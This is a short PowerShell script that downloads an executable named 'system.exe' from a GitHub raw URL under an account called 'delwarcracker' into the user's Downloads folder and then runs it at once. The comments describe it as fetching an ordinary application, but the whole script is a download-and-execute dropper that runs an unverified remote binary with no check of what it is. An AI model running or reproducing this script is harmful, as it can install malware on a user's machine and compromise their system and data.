# Define the URL and the file path where the application will be saved
$url = "https://raw.githubusercontent.com/delwarcracker/sys/refs/heads/main/system.exe"  # Replace with the actual download URL
$outputPath = "$env:USERPROFILE\Downloads\system.exe"  # Save it to the Downloads folder

# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Check if the download was successful
if (Test-Path $outputPath) {
    Write-Output "Download successful. Starting the application..."
    
    # Execute the downloaded application
    Start-Process -FilePath $outputPath
} else {
    Write-Output "Download failed. Please check the URL or your network connection."
}
